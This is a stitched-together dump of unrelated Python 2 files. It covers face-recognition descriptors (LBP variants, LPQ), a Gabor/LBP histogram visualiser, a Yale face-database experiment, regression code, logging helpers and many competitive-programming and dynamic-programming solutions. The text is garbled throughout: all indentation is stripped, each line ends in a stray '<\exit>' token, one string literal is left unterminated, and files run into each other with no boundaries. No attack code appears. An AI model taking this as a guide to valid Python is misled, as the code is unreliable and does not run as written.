sample_points = np.array([-np.sin(theta), np.cos(theta)]).T<\exit>
sample_points *= self._radius<\exit>
miny=min(sample_points[:,0])<\exit>
maxy=max(sample_points[:,0])<\exit>
minx=min(sample_points[:,1])<\exit>
maxx=max(sample_points[:,1])<\exit>
blocksizey = np.ceil(max(maxy,0)) - np.floor(min(miny,0)) + 1<\exit>
blocksizex = np.ceil(max(maxx,0)) - np.floor(min(minx,0)) + 1<\exit>
origy = 0 - np.floor(min(miny,0))<\exit>
origx = 0 - np.floor(min(minx,0))<\exit>
dx = xsize - blocksizex + 1<\exit>
dy = ysize - blocksizey + 1<\exit>
C = np.asarray(X[origy:origy+dy,origx:origx+dx], dtype=np.uint8)<\exit>
result = np.zeros((dy,dx), dtype=np.uint32)<\exit>
for i, p in enumerate(sample_points):<\exit>
y,x = p + (origy, origx)<\exit>
fx = np.floor(x)<\exit>
fy = np.floor(y)<\exit>
cx = np.ceil(x)<\exit>
cy = np.ceil(y)<\exit>
ty = y - fy<\exit>
tx = x - fx<\exit>
w1 = (1 - tx) * (1 - ty)<\exit>
w2 =      tx  * (1 - ty)<\exit>
w3 = (1 - tx) *      ty<\exit>
w4 =      tx  *      ty<\exit>
N = w1*X[fy:fy+dy,fx:fx+dx]<\exit>
N += w2*X[fy:fy+dy,cx:cx+dx]<\exit>
N += w3*X[cy:cy+dy,fx:fx+dx]<\exit>
N += w4*X[cy:cy+dy,cx:cx+dx]<\exit>
D = N >= C<\exit>
result += (1<<i)*D<\exit>
return result<\exit>
@property<\exit>
def radius(self):<\exit>
return self._radius<\exit>
def __repr__(self):<\exit>
return "ExtendedLBP (neighbors=%s, radius=%s)" % (self._neighbors, self._radius)<\exit>
def short_name(self):<\exit>
return "ExtendedLBP"<\exit>
class VarLBP(LocalDescriptor):<\exit>
def __init__(self, radius=1, neighbors=8):<\exit>
LocalDescriptor.__init__(self, neighbors)<\exit>
self._radius = radius<\exit>
def __call__(self,X):<\exit>
X = np.asanyarray(X)<\exit>
ysize, xsize = X.shape<\exit>
angles = 2*np.pi/self._neighbors<\exit>
theta = np.arange(0,2*np.pi,angles)<\exit>
sample_points = np.array([-np.sin(theta), np.cos(theta)]).T<\exit>
sample_points *= self._radius<\exit>
miny=min(sample_points[:,0])<\exit>
maxy=max(sample_points[:,0])<\exit>
minx=min(sample_points[:,1])<\exit>
maxx=max(sample_points[:,1])<\exit>
blocksizey = np.ceil(max(maxy,0)) - np.floor(min(miny,0)) + 1<\exit>
blocksizex = np.ceil(max(maxx,0)) - np.floor(min(minx,0)) + 1<\exit>
origy =  0 - np.floor(min(miny,0))<\exit>
origx =  0 - np.floor(min(minx,0))<\exit>
dx = xsize - blocksizex + 1<\exit>
dy = ysize - blocksizey + 1<\exit>
mean = np.zeros((dy,dx), dtype=np.float32)<\exit>
delta = np.zeros((dy,dx), dtype=np.float32)<\exit>
m2 = np.zeros((dy,dx), dtype=np.float32)<\exit>
result = np.zeros((dy,dx), dtype=np.float32)<\exit>
for i,p in enumerate(sample_points):<\exit>
y,x = p + (origy, origx)<\exit>
fx = np.floor(x)<\exit>
fy = np.floor(y)<\exit>
cx = np.ceil(x)<\exit>
cy = np.ceil(y)<\exit>
ty = y - fy<\exit>
tx = x - fx<\exit>
w1 = (1 - tx) * (1 - ty)<\exit>
w2 =      tx  * (1 - ty)<\exit>
w3 = (1 - tx) *      ty<\exit>
w4 =      tx  *      ty<\exit>
N = w1*X[fy:fy+dy,fx:fx+dx]<\exit>
N += w2*X[fy:fy+dy,cx:cx+dx]<\exit>
N += w3*X[cy:cy+dy,fx:fx+dx]<\exit>
N += w4*X[cy:cy+dy,cx:cx+dx]<\exit>
delta = N - mean<\exit>
mean = mean + delta/float(i+1)<\exit>
m2 = m2 + delta * (N-mean)<\exit>
result = m2/(self._neighbors-1)<\exit>
return result<\exit>
@property<\exit>
def radius(self):<\exit>
return self._radius<\exit>
def __repr__(self):<\exit>
return "VarLBP (neighbors=%s, radius=%s)" % (self._neighbors, self._radius)<\exit>
def short_name(self):<\exit>
return "VarLBP"<\exit>
class LPQ(LocalDescriptor):<\exit>
def __init__(self, radius=3):<\exit>
LocalDescriptor.__init__(self, 8)<\exit>
self._radius = radius<\exit>
def euc_dist(self, X):<\exit>
Y = X = X.astype(np.float)<\exit>
XX = np.sum(X * X, axis=1)[:, np.newaxis]<\exit>
YY = XX.T<\exit>
distances = np.dot(X,Y.T)<\exit>
distances *= -2<\exit>
distances += XX<\exit>
distances += YY<\exit>
np.maximum(distances, 0, distances)<\exit>
distances.flat[::distances.shape[0] + 1] = 0.0<\exit>
return np.sqrt(distances)<\exit>
def __call__(self,X):<\exit>
f = 1.0<\exit>
x = np.arange(-self._radius,self._radius+1)<\exit>
n = len(x)<\exit>
rho = 0.95<\exit>
[xp, yp] = np.meshgrid(np.arange(1,(n+1)),np.arange(1,(n+1)))<\exit>
pp = np.concatenate((xp,yp)).reshape(2,-1)<\exit>
dd = self.euc_dist(pp.T)<\exit>
C = np.power(rho,dd)<\exit>
w0 = (x*0.0+1.0)<\exit>
w1 = np.exp(-2*np.pi*1j*x*f/n)<\exit>
w2 = np.conj(w1)<\exit>
q1 = w0.reshape(-1,1)*w1<\exit>
q2 = w1.reshape(-1,1)*w0<\exit>
q3 = w1.reshape(-1,1)*w1<\exit>
q4 = w1.reshape(-1,1)*w2<\exit>
u1 = np.real(q1)<\exit>
u2 = np.imag(q1)<\exit>
u3 = np.real(q2)<\exit>
u4 = np.imag(q2)<\exit>
u5 = np.real(q3)<\exit>
u6 = np.imag(q3)<\exit>
u7 = np.real(q4)<\exit>
u8 = np.imag(q4)<\exit>
M = np.matrix([u1.flatten(1), u2.flatten(1), u3.flatten(1), u4.flatten(1), u5.flatten(1), u6.flatten(1), u7.flatten(1), u8.flatten(1)])<\exit>
D = np.dot(np.dot(M,C), M.T)<\exit>
U,S,V = np.linalg.svd(D)<\exit>
Qa = convolve2d(convolve2d(X,w0.reshape(-1,1),mode='same'),w1.reshape(1,-1),mode='same')<\exit>
Qb = convolve2d(convolve2d(X,w1.reshape(-1,1),mode='same'),w0.reshape(1,-1),mode='same')<\exit>
Qc = convolve2d(convolve2d(X,w1.reshape(-1,1),mode='same'),w1.reshape(1,-1),mode='same')<\exit>
Qd = convolve2d(convolve2d(X, w1.reshape(-1,1),mode='same'),w2.reshape(1,-1),mode='same')<\exit>
Fa = np.real(Qa)<\exit>
Ga = np.imag(Qa)<\exit>
Fb = np.real(Qb)<\exit>
Gb = np.imag(Qb)<\exit>
Fc = np.real(Qc)<\exit>
Gc = np.imag(Qc)<\exit>
Fd = np.real(Qd)<\exit>
Gd = np.imag(Qd)<\exit>
F = np.array([Fa.flatten(1), Ga.flatten(1), Fb.flatten(1), Gb.flatten(1), Fc.flatten(1), Gc.flatten(1), Fd.flatten(1), Gd.flatten(1)])<\exit>
G = np.dot(V.T, F)<\exit>
t = 0<\exit>
B = (G[0,:]>=t)*1 + (G[1,:]>=t)*2 + (G[2,:]>=t)*4 + (G[3,:]>=t)*8 + (G[4,:]>=t)*16 + (G[5,:]>=t)*32 + (G[6,:]>=t)*64 + (G[7,:]>=t)*128<\exit>
return np.reshape(B, np.shape(Fa))<\exit>
@property<\exit>
def radius(self):<\exit>
return self._radius<\exit>
def __repr__(self):<\exit>
return "LPQ (neighbors=%s, radius=%s)" % (self._neighbors, self._radius)<\exit>
def short_name(self):<\exit>
return "LPQ<\exit>
import sys<\exit>
import cv2<\exit>
import numpy as np<\exit>
from expr.feature import GaborFilterCv2<\exit>
from expr.read_dataset import read_images<\exit>
from facerec_py.facerec.lbp import ExtendedLBP, OriginalLBP<\exit>
from facerec_py.facerec.preprocessing import LBPPreprocessing<\exit>
import matplotlib.pyplot as plt<\exit>
class LbpIntermidiate(object):<\exit>
def __init__(self, lbp=OriginalLBP()):<\exit>
self.X, self.y = self.read()<\exit>
self.lbp = lbp<\exit>
def read(self):<\exit>
if len(sys.argv) < 2:<\exit>
print "USAGE: experiment_setup.py </path/to/images>"<\exit>
sys.exit()<\exit>
X, y = read_images(sys.argv[1])<\exit>
X = np.asarray(X)<\exit>
y = np.asarray(y)<\exit>
return X, y<\exit>
def draw(self):<\exit>
org_imgs = reduce(self.hstack, self.X)<\exit>
lbp_imgs = reduce(self.hstack, map(self.lbp_filter, self.X))<\exit>
cv2.imshow("original", org_imgs)<\exit>
cv2.imshow("lbp", lbp_imgs)<\exit>
cv2.waitKey(0)<\exit>
cv2.destroyAllWindows()<\exit>
def hstack(self, x, y):<\exit>
return np.hstack((x, y))<\exit>
def lbp_filter(self, x):<\exit>
return self.lbp(x).astype(np.uint8)<\exit>
class GaborLbpIntermidiate(LbpIntermidiate):<\exit>
def __init__(self):<\exit>
super(GaborLbpIntermidiate, self).__init__()<\exit>
self.sz = (16, 16)<\exit>
self.py = 0<\exit>
self.px = 0<\exit>
def square(self, X, row, col):<\exit>
for x in X:<\exit>
x[row * self.py, col * self.px:(col + 1) * self.px] = 255<\exit>
x[(row + 1) * self.py, col * self.px:(col + 1) * self.px] = 255<\exit>
x[row * self.py:(row + 1) * self.py, col * self.px] = 255<\exit>
x[row * self.py:(row + 1) * self.py, (col + 1) * self.px] = 255<\exit>
return X<\exit>
def gabor_filter(self, x, idx=34):<\exit>
gabor = GaborFilterCv2(8, 5)<\exit>
return cv2.filter2D(x, cv2.CV_8UC3, gabor._kernels[idx])<\exit>
def draw(self, title, row=12, col=3, gabor_filter=lambda x: x, lbp_filter=lambda x: x):<\exit>
imgs_procssed = map(lbp_filter, map(gabor_filter, self.X))<\exit>
hists = []<\exit>
for i in imgs_procssed:<\exit>
hists.append(self.histogram(i, row, col))<\exit>
cv2.imshow("original", reduce(self.hstack, self.square(self.X, row, col)))<\exit>
plt.subplot()<\exit>
plt.title(title)<\exit>
plt.ylabel("Number of Pixels")<\exit>
plt.xlabel("Gray Level")<\exit>
lines = []<\exit>
for idx, hist in enumerate(hists):<\exit>
line, = plt.plot(range(len(hist)), hist, label="image-%d" % (idx + 1))<\exit>
lines.append(line)<\exit>
plt.legend(handles=lines)<\exit>
plt.show()<\exit>
def run(self):<\exit>
self.draw("Original")<\exit>
self.draw("LBP", lbp_filter=self.lbp_filter)<\exit>
self.draw("Gabor Magnitude", gabor_filter=lambda x: self.gabor_filter(x, 12))<\exit>
self.draw("LGBP", lbp_filter=self.lbp_filter, gabor_filter=self.gabor_filter)<\exit>
def histogram(self, L, row, col):<\exit>
lbp_height, lbp_width = L.shape<\exit>
grid_rows, grid_cols = self.sz<\exit>
self.py = int(np.floor(lbp_height / grid_rows))<\exit>
self.px = int(np.floor(lbp_width / grid_cols))<\exit>
C = L[row * self.py:(row + 1) * self.py, col * self.px:(col + 1) * self.px]<\exit>
H = np.histogram(C,<\exit>
bins=16,<\exit>
range=(0, 2 ** self.lbp.neighbors),<\exit>
weights=None,<\exit>
normed=False<\exit>
)[0]<\exit>
return np.asarray(H)<\exit>
if __name__ == "__main__":<\exit>
print __file__<\exit>
GaborLbpIntermidiate().run()<\exit>
MOD = 1000000007<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.lens = [1, 2, 3, 4]<\exit>
def solve(self, cipher):<\exit>
N, M = cipher<\exit>
f = [0 for _ in xrange(M + 1)]<\exit>
s = [0 for _ in xrange(M + 1)]<\exit>
f[0] = 1<\exit>
for j in xrange(1, M + 1):<\exit>
for l in self.lens:<\exit>
if j - l >= 0:<\exit>
f[j] += f[j - l]<\exit>
f[j] %= MOD<\exit>
f_N = map(lambda x: pow(x, N, MOD), f)<\exit>
for j in xrange(1, M + 1):<\exit>
s[j] = f_N[j]<\exit>
if s[j] <= 0: break<\exit>
for k in xrange(1, j):<\exit>
s[j] -= f_N[j - k] * s[k]<\exit>
s[j] %= MOD<\exit>
return s[M]<\exit>
class Solution_TLE(object):<\exit>
def __init__(self):<\exit>
self.lens = [1, 2, 3, 4]<\exit>
def solve(self, cipher):<\exit>
N, M = cipher<\exit>
f = [[0 for _ in xrange(M + 1)] for _ in xrange(N + 1)]<\exit>
s = [[0 for _ in xrange(M + 1)] for _ in xrange(N + 1)]<\exit>
f[1][0] = 1<\exit>
for j in xrange(1, M + 1):<\exit>
for l in self.lens:<\exit>
if j - l >= 0:<\exit>
f[1][j] += f[1][j - l]<\exit>
f[1][j] %= MOD<\exit>
for i in xrange(2, N + 1):<\exit>
for j in xrange(1, M + 1):<\exit>
f[i][j] = f[i - 1][j] * f[1][j]<\exit>
f[i][j] %= MOD<\exit>
for i in xrange(1, N + 1):<\exit>
for j in xrange(1, M + 1):<\exit>
s[i][j] = f[i][j]<\exit>
if s[i][j] <= 0: break<\exit>
for k in xrange(1, j):<\exit>
s[i][j] -= f[i][j - k] * s[i][k]<\exit>
s[i][j] %= MOD<\exit>
return s[N][M]<\exit>
def solve_error(self, cipher):<\exit>
N, M = cipher<\exit>
f = [[0 for _ in xrange(M + 1)] for _ in xrange(N + 1)]<\exit>
f[1][1] = 1<\exit>
for j in xrange(1, M + 1):<\exit>
for l in self.lens:<\exit>
if j - l >= 1:<\exit>
f[1][j] += f[1][j - l]<\exit>
for j in xrange(1, M + 1):<\exit>
f[1][j] -= f[1][j - 1]<\exit>
for i in xrange(2, N + 1):<\exit>
for j in xrange(1, M + 1):<\exit>
cmb = i<\exit>
for l in xrange(1, i + 1):<\exit>
f[i][j] += cmb * f[i - l][j - 1] * (f[1][j] ** i)<\exit>
cmb = cmb * (i - l) / (l + 1)<\exit>
return f[N][M]<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
class Predictor(object):<\exit>
def linear_regression(self, mat_X, vec_Y):<\exit>
mat_A = np.dot(mat_X, mat_X.T)<\exit>
vec_b = np.dot(mat_X, vec_Y.T)<\exit>
vec_w = np.dot(np.linalg.inv(mat_A), vec_b)<\exit>
return vec_w<\exit>
def predict(self, vec_w, mat_X):<\exit>
vec_Y_predicted = np.dot(vec_w.T, mat_X)<\exit>
return vec_Y_predicted<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
l = 1<\exit>
h = cipher<\exit>
while l <= h:<\exit>
mid = (l + h) / 2<\exit>
if self.sum_of_squares(mid) <= cipher:<\exit>
l = mid + 1<\exit>
else:<\exit>
h = mid - 1<\exit>
l -= 1<\exit>
return l<\exit>
def sum_of_squares(self, n):<\exit>
return n * (n + 1) * (2 * n + 1) / 6<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import logging<\exit>
import sys<\exit>
class LoggerFactory(object):<\exit>
def getConsoleLogger(self, cls_name, level=logging.DEBUG):<\exit>
lgr = logging.getLogger(cls_name)<\exit>
lgr.setLevel(level)<\exit>
if not lgr.handlers:<\exit>
ch = logging.StreamHandler(sys.stdout)<\exit>
ch.setLevel(level)<\exit>
ch.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))<\exit>
lgr.addHandler(ch)<\exit>
return lgr<\exit>
import numpy as np<\exit>
from scipy.stats import logistic<\exit>
import matplotlib.pyplot as plt<\exit>
class LogisticRegressioner(object):<\exit>
def __init__(self, tol=1e-6):<\exit>
self.tol = tol<\exit>
def first_derivative(self, X, Y, w):<\exit>
d, T = X.shape<\exit>
sigma = logistic.cdf(np.multiply(-Y, np.dot(w.T, X)))<\exit>
ret = np.multiply(sigma, Y)<\exit>
ret = np.multiply(np.repeat(ret[np.newaxis, :], d, axis=0), X)<\exit>
ret = np.sum(ret, axis=1)<\exit>
return ret<\exit>
def log_loss(self, X, Y, w):<\exit>
L = np.log(logistic.cdf(np.multiply(Y, np.dot(w.T, X))))<\exit>
L = np.sum(L)<\exit>
L = -L<\exit>
return L<\exit>
def classifier_w(self, X, Y,eta=0.05):<\exit>
X = X.T<\exit>
d, T = X.shape<\exit>
X = np.vstack([np.ones((T, )), X])<\exit>
d += 1<\exit>
w = np.zeros(d)<\exit>
t = 0<\exit>
while True:<\exit>
t += 1<\exit>
w_ = w + eta*self.first_derivative(X, Y, w)<\exit>
L_old, L_new = self.log_loss(X, Y, w_), self.log_loss(X, Y, w)<\exit>
if np.abs(L_old - L_new) < self.tol: break<\exit>
w = w_<\exit>
if t % 300 == 1: yield w<\exit>
yield w<\exit>
def test_sample(self):<\exit>
X = np.array([<\exit>
[2, 1],<\exit>
[1, 20],<\exit>
[1, 5],<\exit>
[4, 1],<\exit>
[1, 40],<\exit>
[3, 30],<\exit>
])<\exit>
Y = np.array([<\exit>
-1,<\exit>
-1,<\exit>
-1,<\exit>
1,<\exit>
1,<\exit>
1,<\exit>
])<\exit>
ws = list(self.classifier_w(X, Y))<\exit>
print ws[-1]<\exit>
from contextlib import contextmanager<\exit>
import logging<\exit>
@contextmanager<\exit>
def debug_logging(level):<\exit>
logger = logging.getLogger()<\exit>
old_level = logger.getEffectiveLevel()<\exit>
logger.setLevel(level)<\exit>
try:<\exit>
yield<\exit>
finally:<\exit>
logger.setLevel(old_level)<\exit>
@contextmanager<\exit>
def log_level(level, name):<\exit>
logger = logging.getLogger(name)<\exit>
old_level = logger.getEffectiveLevel()<\exit>
logger.setLevel(level)<\exit>
try:<\exit>
yield logger<\exit>
finally:<\exit>
logger.setLevel(old_level)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = cipher<\exit>
bit = 0<\exit>
for item in A:<\exit>
bit ^= item<\exit>
return bit<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution:<\exit>
def longestCommonSubsequence(self, A, B):<\exit>
m = len(A)<\exit>
n = len(B)<\exit>
f = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
if m == 0 or n == 0:<\exit>
return 0<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
if A[i-1] == B[j-1]:<\exit>
f[i][j] = f[i-1][j-1]+1<\exit>
else:<\exit>
f[i][j] = max(f[i][j-1], f[i-1][j])<\exit>
return f[-1][-1]<\exit>
class Solution:<\exit>
def longestCommonSubstring(self, A, B):<\exit>
m = len(A)<\exit>
n = len(B)<\exit>
f = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
if m == 0 or n == 0:<\exit>
return 0<\exit>
maxa = -1<\exit>
for i in xrange(1, m+1):<\exit>
for j in xrange(1, n+1):<\exit>
if A[i-1] == B[j-1]:<\exit>
f[i][j] = f[i-1][j-1]+1<\exit>
else:<\exit>
f[i][j] = 0<\exit>
maxa = max(maxa, f[i][j])<\exit>
return maxa<\exit>
class Solution:<\exit>
def longestIncreasingContinuousSubsequence(self, A):<\exit>
n = len(A)<\exit>
if n < 1:<\exit>
return 0<\exit>
maxa = 1<\exit>
cur = 1<\exit>
for i in xrange(1, n):<\exit>
if A[i] > A[i-1]:<\exit>
cur += 1<\exit>
maxa = max(maxa, cur)<\exit>
else:<\exit>
cur = 1<\exit>
cur = 1<\exit>
for i in xrange(1, n):<\exit>
if A[n-1-i] > A[n-1-i+1]:<\exit>
cur += 1<\exit>
maxa = max(maxa, cur)<\exit>
else:<\exit>
cur = 1<\exit>
return maxa<\exit>
class Solution:<\exit>
def longestIncreasingSubsequence(self, nums):<\exit>
n = len(nums)<\exit>
if n == 0:<\exit>
return 0<\exit>
maxa = 1<\exit>
f = [1 for _ in xrange(n)]<\exit>
for i in xrange(n):<\exit>
for j in xrange(i):<\exit>
if nums[i] >= nums[j]:<\exit>
f[i] = max(f[i], f[j]+1)<\exit>
maxa = max(maxa, f[i])<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestIncreasingSubsequence(<\exit>
[88, 4, 24, 82, 86, 1, 56, 74, 71, 9, 8, 18, 26, 53, 77, 87, 60, 27, 69, 17, 76, 23, 67, 14, 98, 13, 10, 83, 20,<\exit>
43, 39, 29, 92, 31, 0, 30, 90, 70, 37, 59]) == 10<\exit>
class Solution:<\exit>
def longestPalindrome(self, s):<\exit>
n = len(s)<\exit>
pa = [[False for _ in xrange(n+1)] for _ in xrange(n)]<\exit>
for i in xrange(n):<\exit>
pa[i][i] = True<\exit>
pa[i][i+1] = True<\exit>
maxa = (0, 1)<\exit>
for i in xrange(n-2, -1, -1):<\exit>
for j in xrange(i+2, n+1):<\exit>
pa[i][j] = pa[i+1][j-1] and s[i] == s[j-1]<\exit>
if pa[i][j] and j-i > maxa[1]-maxa[0]:<\exit>
maxa = (i, j)<\exit>
return s[maxa[0]:maxa[1]]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestPalindrome("abcdzdcab") == "cdzdc"<\exit>
class Solution:<\exit>
def lengthOfLongestSubstringKDistinct(self, s, k):<\exit>
if len(s)<1 or k<1:<\exit>
return 0<\exit>
cnt = {}<\exit>
b = 0<\exit>
e = 1<\exit>
cnt[s[b]] = 1<\exit>
maxa = 1<\exit>
while e<len(s):<\exit>
if s[e] not in cnt:<\exit>
cnt[s[e]] = 0<\exit>
cnt[s[e]] += 1<\exit>
e += 1<\exit>
while len(cnt)>k:<\exit>
cnt[s[b]] -= 1<\exit>
if cnt[s[b]]<=0:<\exit>
del cnt[s[b]]<\exit>
b += 1<\exit>
maxa = max(maxa, e-b)<\exit>
return maxa<\exit>
if __name__=="__main__":<\exit>
assert Solution().lengthOfLongestSubstringKDistinct("eceba", 3)==4<\exit>
class Solution:<\exit>
def lengthOfLongestSubstring(self, s):<\exit>
b = 0<\exit>
e = 0<\exit>
n = len(s)<\exit>
maxa = 0<\exit>
st = set()<\exit>
while e < n:<\exit>
while s[e] in st:<\exit>
st.remove(s[b])<\exit>
b += 1<\exit>
st.add(s[e])<\exit>
e += 1<\exit>
maxa = max(maxa, e-b)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lengthOfLongestSubstring("abcabcbb") == 3<\exit>
class Solution:<\exit>
def longestWords(self, dictionary):<\exit>
ret = []<\exit>
for word in dictionary:<\exit>
if not ret or len(word) > len(ret[0]):<\exit>
ret = [word]<\exit>
elif len(word) == len(ret[0]):<\exit>
ret.append(word)<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def lowestCommonAncestor(self, root, A, B):<\exit>
p1 = self.path(root, A)<\exit>
p2 = self.path(root, B)<\exit>
p1.append(TreeNode(0))<\exit>
p2.append(TreeNode(0))<\exit>
for ind, val in enumerate(p1):<\exit>
if val != p2[ind]:<\exit>
return p1[ind-1]<\exit>
def path(self, root, target):<\exit>
ans = []<\exit>
self.get_path(root, target, [], ans)<\exit>
return ans<\exit>
def get_path(self, cur, target, path, ans):<\exit>
if not cur:<\exit>
return False<\exit>
path.append(cur)<\exit>
if cur == target:<\exit>
ans.extend(path)<\exit>
return True<\exit>
if cur.left and self.get_path(cur.left, target, path, ans):<\exit>
return True<\exit>
if cur.right and self.get_path(cur.right, target, path, ans):<\exit>
return True<\exit>
path.pop()<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
node = TreeNode(1)<\exit>
print Solution().lowestCommonAncestor(node, node, node)<\exit>
nodes = dict(zip(range(3, 8), [TreeNode(i) for i in range(3, 8)]))<\exit>
nodes[4].left = nodes[3]<\exit>
nodes[4].right = nodes[7]<\exit>
nodes[7].left = nodes[5]<\exit>
nodes[7].right = nodes[6]<\exit>
print Solution().lowestCommonAncestor(nodes[4], nodes[3], nodes[5])<\exit>
import numpy as np<\exit>
from scipy import ndimage<\exit>
import os<\exit>
import sys<\exit>
sys.path.append("../..")<\exit>
try:<\exit>
from PIL import Image<\exit>
except ImportError:<\exit>
import Image<\exit>
import matplotlib.pyplot as plt<\exit>
import textwrap<\exit>
import logging<\exit>
from facerec.feature import SpatialHistogram<\exit>
from facerec.distance import ChiSquareDistance<\exit>
from facerec.classifier import NearestNeighbor<\exit>
from facerec.model import PredictableModel<\exit>
from facerec.lbp import LPQ, ExtendedLBP<\exit>
from facerec.validation import SimpleValidation, precision<\exit>
from facerec.util import shuffle_array<\exit>
EXPERIMENT_NAME = "LocalPhaseQuantizationExperiment"<\exit>
ITER_MAX = 1<\exit>
class FileNameFilter:<\exit>
def __init__(self, name):<\exit>
self._name = name<\exit>
def __call__(self, filename):<\exit>
return True<\exit>
def __repr__(self):<\exit>
return "FileNameFilter (name=%s)" % (self._name)<\exit>
class YaleBaseFilter(FileNameFilter):<\exit>
def __init__(self, min_azimuth, max_azimuth, min_elevation, max_elevation):<\exit>
FileNameFilter.__init__(self, "Filter YaleFDB Subset1")<\exit>
self._min_azimuth = min_azimuth<\exit>
self._max_azimuth = max_azimuth<\exit>
self._min_elevation = min_elevation<\exit>
self._max_elevation = max_elevation<\exit>
def __call__(self, filename):<\exit>
filetype = filename[-4:]<\exit>
if filetype != ".pgm":<\exit>
return False<\exit>
if "Ambient" in filename:<\exit>
return False<\exit>
azimuth = abs(int(filename[12:16]))<\exit>
elevation = abs(int(filename[17:20]))<\exit>
if azimuth < self._min_azimuth or azimuth > self._max_azimuth:<\exit>
return False<\exit>
if elevation < self._min_elevation or elevation > self._max_elevation:<\exit>
return False<\exit>
return True<\exit>
def __repr__(self):<\exit>
return "Yale FDB Filter (min_azimuth=%s, max_azimuth=%s, min_elevation=%s, max_elevation=%s)" % (min_azimuth, max_azimuth, min_elevation, max_elevation)<\exit>
def read_images(path, fileNameFilter=FileNameFilter("None"), sz=None):<\exit>
c = 0<\exit>
X,y = [], []<\exit>
for dirname, dirnames, filenames in os.walk(path):<\exit>
for subdirname in dirnames:<\exit>
subject_path = os.path.join(dirname, subdirname)<\exit>
for filename in os.listdir(subject_path):<\exit>
if fileNameFilter(filename):<\exit>
try:<\exit>
im = Image.open(os.path.join(subject_path, filename))<\exit>
im = im.convert("L")<\exit>
if (sz is not None):<\exit>
im = im.resize(sz, Image.ANTIALIAS)<\exit>
X.append(np.asarray(im, dtype=np.uint8))<\exit>
y.append(c)<\exit>
except IOError, (errno, strerror):<\exit>
print "I/O error({0}): {1}".format(errno, strerror)<\exit>
except:<\exit>
print "Unexpected error:", sys.exc_info()[0]<\exit>
raise<\exit>
c = c+1<\exit>
return [X,y]<\exit>
def apply_gaussian(X, sigma):<\exit>
return np.array([ndimage.gaussian_filter(x, sigma) for x in X])<\exit>
def results_to_list(validation_results):<\exit>
return [precision(result.true_positives,result.false_positives) for result in validation_results]<\exit>
def partition_data(X, y):<\exit>
Xs,ys = shuffle_array(X,y)<\exit>
mapping = {}<\exit>
for i in xrange(len(y)):<\exit>
yi = ys[i]<\exit>
try:<\exit>
mapping[yi].append(i)<\exit>
except KeyError:<\exit>
mapping[yi] = [i]<\exit>
Xtrain, ytrain = [], []<\exit>
Xtest, ytest = [], []<\exit>
for key, indices in mapping.iteritems():<\exit>
Xtrain.extend([ Xs[i] for i in indices[:1] ])<\exit>
ytrain.extend([ ys[i] for i in indices[:1] ])<\exit>
Xtest.extend([ Xs[i] for i in indices[1:20]])<\exit>
ytest.extend([ ys[i] for i in indices[1:20]])<\exit>
return Xtrain, ytrain, Xtest, ytest<\exit>
class ModelWrapper:<\exit>
def __init__(model):<\exit>
self.model = model<\exit>
self.result = []<\exit>
if __name__ == "__main__":<\exit>
out_dir = None<\exit>
if len(sys.argv) < 2:<\exit>
print "USAGE: lpq_experiment.py </path/to/images>"<\exit>
sys.exit()<\exit>
yale_subset_0_40 = YaleBaseFilter(0, 40, 0, 40)<\exit>
[X,y] = read_images(sys.argv[1], yale_subset_0_40, sz=(64,64))<\exit>
handler = logging.StreamHandler(sys.stdout)<\exit>
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')<\exit>
handler.setFormatter(formatter)<\exit>
logger = logging.getLogger("facerec")<\exit>
logger.addHandler(handler)<\exit>
logger.setLevel(logging.INFO)<\exit>
model0 = PredictableModel(feature=SpatialHistogram(lbp_operator=ExtendedLBP()), classifier=NearestNeighbor(dist_metric=ChiSquareDistance(), k=1))<\exit>
model1 = PredictableModel(feature=SpatialHistogram(lbp_operator=LPQ()), classifier=NearestNeighbor(dist_metric=ChiSquareDistance(), k=1))<\exit>
sigmas = [0]<\exit>
print 'The experiment will be run %s times!' % ITER_MAX<\exit>
experiments = {}<\exit>
experiments['lbp_model'] = { 'model': model0, 'results' : {}, 'color' : 'r', 'linestyle' : '--', 'marker' : '*'}<\exit>
experiments['lpq_model'] = { 'model': model1, 'results' : {}, 'color' : 'b', 'linestyle' : '--', 'marker' : 's'}<\exit>
for sigma in sigmas:<\exit>
print "Setting sigma=%s" % sigma<\exit>
for key, value in experiments.iteritems():<\exit>
print 'Running experiment for model=%s' % key<\exit>
cv0 = SimpleValidation(value['model'])<\exit>
for iteration in xrange(ITER_MAX):<\exit>
print "Repeating experiment %s/%s." % (iteration + 1, ITER_MAX)<\exit>
Xtrain, ytrain, Xtest, ytest = partition_data(X,y)<\exit>
Xs = apply_gaussian(Xtest, sigma)<\exit>
experiment_description = "%s (iteration=%s, sigma=%.2f)" % (EXPERIMENT_NAME, iteration, sigma)<\exit>
cv0.validate(Xtrain, ytrain, Xs, ytest, experiment_description)<\exit>
